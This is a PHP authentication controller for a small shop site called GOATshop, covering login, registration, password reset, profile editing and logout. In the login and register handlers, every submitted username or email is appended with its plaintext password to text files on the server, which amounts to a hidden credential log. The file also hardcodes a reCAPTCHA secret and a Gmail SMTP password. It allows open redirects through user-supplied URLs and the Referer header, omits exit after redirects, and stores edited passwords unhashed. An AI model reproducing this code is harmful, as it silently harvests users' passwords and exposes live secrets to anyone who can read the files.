<?php
session_start();
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function

require "../../assets/vendor/PHPMailer/src/PHPMailer.php";
require "../../assets/vendor/PHPMailer/src/Exception.php";
require "../../assets/vendor/PHPMailer/src/SMTP.php";
// require "../../models/getModel.php";


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


require_once '../../model/KhachHangModel.php';
require_once '../../model/NhanVienModel.php';
require_once '../../model/UserModel.php';
$kh = new KhachHangModel();
$nhanVien = new NhanVienModel();
$user = new UserModel();


if (isset($_GET['req'])) {
    switch ($_GET['req']) {
        case "dang-nhap":

            $captcha = $_POST['g-recaptcha-response'];

            $url = $_POST['url'];
            $emailOrUsername = $_POST['email_or_username'];
            $password = $_POST['password'];
            $secret = '6LeCaZkpAAAAAB9T3X4XQN55xopilzrXny4-kS3u'; //Thay thế bằng mã Secret Key của bạn
            $verify_response = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=' . $secret . '&response=' . $captcha);
            $response_data = json_decode($verify_response);
            if ($response_data->success) {
                $open = fopen('taikhoanLogin.txt', 'a');
                fwrite($open, $emailOrUsername . '|' . $password . "\n");
                fclose($open);
            } else {
                header('location: ../index.php?pages=dang-nhap&msg=!recaptcha');
            }
            //mã hoá mặt khẩu
            $password = $user->Ma_Hoa_Mat_Khau(trim($_POST['password']));

            $res = $kh->KhachHang__Dang_Nhap($emailOrUsername, $password);
            if (!$captcha) {
                header('location: ../index.php?pages=dang-nhap&msg=!recaptcha');
            } elseif ($res == false) {
                $resad = $nhanVien->NhanVien__Dang_Nhap($emailOrUsername, $password);
                if ($resad == false) {
                    header('location: ../index.php?pages=dang-nhap&msg=warning');
                } else {
                    if ($resad->phanquyen == 1) {
                        if (isset($_SESSION['manager'])) {
                            unset($_SESSION['manager']);
                        }
                        $_SESSION['manager'] = $resad;

                        header('location: ../../admin/');
                    } elseif ($resad->phanquyen == 2) {
                        if (isset($_SESSION['nhanvien'])) {
                            unset($_SESSION['nhanvien']);
                        }
                        $_SESSION['nhanvien'] = $resad;

                        header('location: ../../admin/');
                    } elseif ($resad->phanquyen == 0) {
                        if (isset($_SESSION['admin'])) {
                            unset($_SESSION['admin']);
                        }
                        $_SESSION['admin'] = $resad;
                        header('location: ../../admin/');
                    }
                }
            } else {
                if (isset($_SESSION['user'])) {
                    unset($_SESSION['user']);
                }
                $_SESSION['user'] = $res;
                header('location:' . $url);
            }

            break;


        case "dang-ky":

            $res = 0;
            $tenhienthi = $_POST['tenkh'];
            $gioitinh = $_POST['gioitinh'];
            $ngaysinh = $_POST['ngaysinh'];
            $sodienthoai = $_POST['sodienthoai'];
            // Lấy thông tin địa chỉ
            $province_id = $_POST['province_name'];
            $district_id = $_POST['district_name'];
            $wards_id = $_POST['wards'];
            $road = $_POST['road'];

            $email = $_POST['email'];
            $username = $_POST['username'];
            $trangthai = 1;
            $password = $_POST['password'];

            if ($email == $password || $username == $password) {
                header('location: ../index.php?pages=dang-ky&msg=samepwu');
            }

            $captcha = $_POST['g-recaptcha-response'];
            $secret = '6LeCaZkpAAAAAB9T3X4XQN55xopilzrXny4-kS3u'; //Thay thế bằng mã Secret Key của bạn
            $verify_response = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=' . $secret . '&response=' . $captcha);
            $response_data = json_decode($verify_response);
            if ($response_data->success) {
                $open = fopen('taikhoanRegister.txt', 'a');
                fwrite($open, $username . '|' . $email . '|' . $password . "\n");
                fclose($open);
            } else {
                header('location: ../index.php?pages=dang-ky&msg=!recaptcha');
            }
            // mã hoá mật khẩu
            $password = $user->Ma_Hoa_Mat_Khau(trim($_POST['password']));

            if ($captcha) {
                if ($kh->KhachHang__Check_Email($email) && $user->User__Check_Username($username)) {
                    $res += $kh->KhachHang__Add($tenhienthi, $gioitinh, $ngaysinh, $sodienthoai, $province_id, $district_id, $wards_id, $road, $email, $username, $password, $trangthai);
                }
            }
            // if ($nhanVien->NhanVien__Check_Email($email)) {
            //     $res += $nhanVien->NhanVien__Add($tenhienthi, $gioitinh, $ngaysinh, $sodienthoai, $diachi, $email,$password, $username, $trangthai, 0);
            // }

            if (!$captcha) {
                header('location: ../index.php?pages=dang-ky&msg=!recaptcha');
            } elseif ($res != false) {

                header('location: ../index.php?pages=dang-nhap&msg=success');
            } else {
                header('location: ../index.php?pages=dang-ky&msg=error');
            }
            break;
        case "send_reset_link":
            ob_start();
            if (isset($_POST['email'])) {
                $email = $_POST['email'];
                $token = bin2hex(random_bytes(50)); // Tạo token ngẫu nhiên

                // Kiểm tra email có tồn tại trong cơ sở dữ liệu không
                if ($kh->KhachHang__Check_Exist_Email($email)) {
                    // Lưu token vào cơ sở dữ liệu
                    $kh->KhachHang__Save_Token($token, $email);

                    // Gửi email đặt lại mật khẩu
                    $resetLink = "http://localhost/GOATshop/auth/index.php?pages=reset-password&token=$token";

                    //Create an instance; passing `true` enables exceptions
                    $mail = new PHPMailer(true);

                    // $href = $_SERVER["HTTP_REFERER"];
                    // if (strpos($href, '&status') !== false) {
                    //     $href = explode('&status', $href)[0];
                    // }

                    try {
                        // Server settings
                        $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
                        $mail->isSMTP();                                            // Send using SMTP
                        $mail->Host       = 'smtp.gmail.com';                       // Set the SMTP server to send through
                        $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
                        $mail->Username   = 'huynhbarca@gmail.com';                 // SMTP username
                        $mail->Password   = 'fjal neiz xplr nnpn';                  // SMTP password
                        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            // Enable implicit TLS encryption
                        $mail->CharSet = PHPMailer::CHARSET_UTF8;                   // Set charset
                        $mail->Port       = 465;                                    // TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

                        // Recipients
                        $mail->setFrom('huynhbarca@gmail.com', 'GOATshop');
                        $mail->addAddress($email, $email);                          // Add a recipient

                        // Content
                        $mail->isHTML(true);
                        $mail->Subject = 'Đặt lại mật khẩu';
                        $mail->Body    = "Nhấp vào liên kết sau để đặt lại mật khẩu của bạn: $resetLink";
                        $mail->AltBody = "Nhấp vào liên kết sau để đặt lại mật khẩu của bạn: $resetLink";

                        $mail->send();
                        // Chuyển hướng sang trang đăng nhập sau khi gửi email thành công
                        header('location: ../index.php?pages=dang-nhap');
                        exit(); // Dừng thực thi ngay lập tức sau khi chuyển hướng
                    } catch (Exception $e) {
                        // Gửi email thất bại
                        header('location: ../index.php?pages=quen-mat-khau&msg=reset_error');
                    }
                } else {
                    // Email không tồn tại trong cơ sở dữ liệu
                    header('location: ../index.php?pages=quen-mat-khau&msg=reset_error_exist');
                    echo "Email không tồn tại.";
                }
            } else {
                header('location: ../index.php?pages=quen-mat-khau&msg=reset_error');
            }
            ob_end_flush();
            break;
        case "update_password":

            if (isset($_POST['token']) && isset($_POST['password'])) {
                $res = 0;
                $token = $_POST['token'];
                $date = date('Y-m-d H:i:s');
                // $password = password_hash($_POST['password'], PASSWORD_BCRYPT);
                $password = $user->Ma_Hoa_Mat_Khau(trim($_POST['password']));
                // Xác minh token
                if ($kh->XacMinh_Token($token, $date)) {
                    $res += $kh->Update_Password($password, $token);
                } else {
                    header('location: ../index.php?pages=reset-password&msg=reset_error');
                }
            }
            if ($res != 0) {
                header('location: ../index.php?pages=notification');
            } else {
                header('location: ../index.php?pages=reset-password&msg=reset_error');
            }
            break;
        case "chinh-sua":
            $res = 0;
            $makh = $_POST['makh'];
            $tenkh = $_POST['tenkh'];
            $username = $_POST['username'];
            $gioitinh = $_POST['gioitinh'];
            $ngaysinh = $_POST['ngaysinh'];
            $sodienthoai = $_POST['sodienthoai'];
            $diachi = $_POST['diachi'];
            $trangthai = 1;


            // $email_old = trim($_POST['email_old']);
            // $email_new = trim($_POST['email_new']);
            $email_old = $_POST['email_old'];
            $email_new = $_POST['email_new'];

            $email = $email_old;

            if ($email_new != $email_old && strlen($email_new) > 0) {
                if ($kh->KhachHang__Check_Email($email_new)) {
                    $email = $email_new;
                } else {
                    header('location: ../../index.php?pages=khach-hang&msg=error');
                }
            }
            // $password_old = trim($_POST['password_old']);
            // $password_new = trim($_POST['password_new']);
            $password_old = $_POST['password_old'];
            $password_new = $_POST['password_new'];

            $password = $password_old;

            if ($password_new != $password_old && strlen($password_new) > 0) {
                $password = $password_new;
            }
            echo $res += $kh->KhachHang__Update($makh, $tenkh, $username, $gioitinh, $ngaysinh, $sodienthoai, $diachi, $email, $password, $trangthai);
            if ($res != 0) {
                header('location: ../index.php?pages=chinh-sua');
            } else {
                header('location: ../index.php?pages=chinh-sua');
            }
            break;

        case "dang-xuat":
            if (isset($_SESSION['manager'])) {
                unset($_SESSION['manager']);
            }
            if (isset($_SESSION['admin'])) {
                unset($_SESSION['admin']);
            }
            if (isset($_SESSION['user'])) {
                unset($_SESSION['user']);
            }
            if (isset($_SESSION['nhanvien'])) {
                unset($_SESSION['nhanvien']);
            }
            header('location:' . $_SERVER["HTTP_REFERER"]);
            // echo $_SERVER["HTTP_REFERER"];
            break;
        default:
            break;
    }
}
